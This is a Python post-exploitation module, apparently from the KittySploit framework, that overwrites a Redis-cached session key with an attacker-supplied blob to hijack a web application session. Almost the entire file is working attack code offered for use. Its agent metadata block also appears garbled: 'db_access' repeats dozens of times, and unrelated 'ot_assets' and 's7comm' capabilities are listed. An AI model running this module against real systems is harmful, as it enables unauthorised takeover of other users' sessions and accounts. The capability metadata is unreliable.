from kittysploit import *
from lib.protocols.redis.redis_client import RedisClient


class Module(Post, RedisClient):

	__info__ = {
		"name": "Redis Inject Session",
		"description": "Overwrite a cached session key to hijack an application session",
		"author": "KittySploit Team",
		"session_type": SessionType.REDIS,
	'agent': {
	    'risk': 'intrusive',
	    'effects': ['target_modification', 'active_exploitation'],
	    'expected_requests': 2,
	    'reversible': True,
	    'approval_required': True,
	    'produces': ['risk_signals'],
	    'cost': 1.5,
	    'noise': 0.5,
	    'value': 1.0,
	    'requires': 	    {'min_endpoints': 0,
	     'min_params': 0,
	     'tech_hints_any': [],
	     'tech_hints_all': [],
	     'specializations_any': [],
	     'risk_signals_any': [],
	     'auth_session': False,
	     'capabilities_any': [],
	     'capabilities_all': [],
	     'confidence_min': {},
	     'confidence_min_any': {},
	     'endpoint_pattern_any': [],
	     'param_any': [],
	     'api_surface_ready': False},
	    'chain': 	    {'produces_capabilities': [{'capability': 'db_access', 'from_detail': ''},
	                               {'capability': 'db_access', 'from_detail': ''},
	                               {'capability': 's7comm', 'from_detail': ''},
	                               {'capability': 'ot_assets', 'from_detail': ''},
	                               {'capability': 'ot_assets', 'from_detail': ''},
	                               {'capability': 'db_access', 'from_detail': ''},
	                               {'capability': 'db_access', 'from_detail': ''},
	                               {'capability': 'db_access', 'from_detail': ''},
	                               {'capability': 'db_access', 'from_detail': ''},
	                               {'capability': 'db_access', 'from_detail': ''},
	                               {'capability': 'db_access', 'from_detail': ''},
	                               {'capability': 'db_access', 'from_detail': ''},
	                               {'capability': 'db_access', 'from_detail': ''},
	                               {'capability': 'db_access', 'from_detail': ''},
	                               {'capability': 'db_access', 'from_detail': ''},
	                               {'capability': 'db_access', 'from_detail': ''},
	                               {'capability': 'db_access', 'from_detail': ''},
	                               {'capability': 'db_access', 'from_detail': ''},
	                               {'capability': 'db_access', 'from_detail': ''},
	                               {'capability': 'db_access', 'from_detail': ''},
	                               {'capability': 'db_access', 'from_detail': ''},
	                               {'capability': 'db_access', 'from_detail': ''},
	                               {'capability': 'db_access', 'from_detail': ''},
	                               {'capability': 'db_access', 'from_detail': ''},
	                               {'capability': 'db_access', 'from_detail': ''},
	                               {'capability': 'db_access', 'from_detail': ''},
	                               {'capability': 'db_access', 'from_detail': ''},
	                               {'capability': 'db_access', 'from_detail': ''},
	                               {'capability': 'db_access', 'from_detail': ''},
	                               {'capability': 'db_access', 'from_detail': ''}],
	     'consumes_capabilities': ['shell'],
	     'option_bindings': {},
	     'suggested_followups': []},
	},
	}

	session_key = OptString("", "Session cache key (e.g. spring:session:sessions:abc123)", True)
	payload = OptString("", "New session payload (serialized session blob or token)", True)
	ttl = OptInteger(0, "TTL in seconds (0 = keep existing TTL)", False)
	db = OptInteger(-1, "Database index (0-15, -1 = keep current)", False)
	show_current = OptBool(True, "Display current value before overwrite", False)

	def run(self):
		try:
			session_key = str(self.session_key or "").strip()
			payload = str(self.payload if self.payload is not None else "")
			if not session_key:
				raise ProcedureError(FailureType.ConfigurationError, "session_key is required")
			if not payload:
				raise ProcedureError(FailureType.ConfigurationError, "payload is required")

			if self.db is not None and int(self.db) >= 0:
				self.select_db(int(self.db))

			info = self.get_session_info()
			print_info(f"Target: {info.get('host', 'localhost')}:{info.get('port', 6379)} db{info.get('db', 0)}")
			print_info(f"Session key: {session_key}")

			key_type = self.get_key_type(session_key)
			if key_type not in ("none", "string"):
				raise ProcedureError(
					FailureType.NotAccess,
					f"Key type is {key_type!r}; session hijack expects a string key",
				)

			current_ttl = self.get_ttl(session_key) if key_type == "string" else -2
			if self.show_current and key_type == "string":
				current = self.get_string_value(session_key, max_length=512)
				if current is not None:
					print_info(f"Current value: {current}")
				print_info(f"Current TTL: {current_ttl}")

			ex = None
			if self.ttl and int(self.ttl) > 0:
				ex = int(self.ttl)
			elif key_type == "string" and current_ttl > 0:
				ex = current_ttl

			if self.set_string(session_key, payload, ex=ex):
				print_success(f"Session key {session_key!r} overwritten")
				if ex:
					print_info(f"  TTL: {ex}s")
				else:
					print_info("  TTL: persistent")
				return True

			raise ProcedureError(FailureType.Unknown, "Failed to overwrite session key")
		except ProcedureError:
			raise
		except Exception as exc:
			raise ProcedureError(FailureType.Unknown, f"Session injection failed: {exc}")
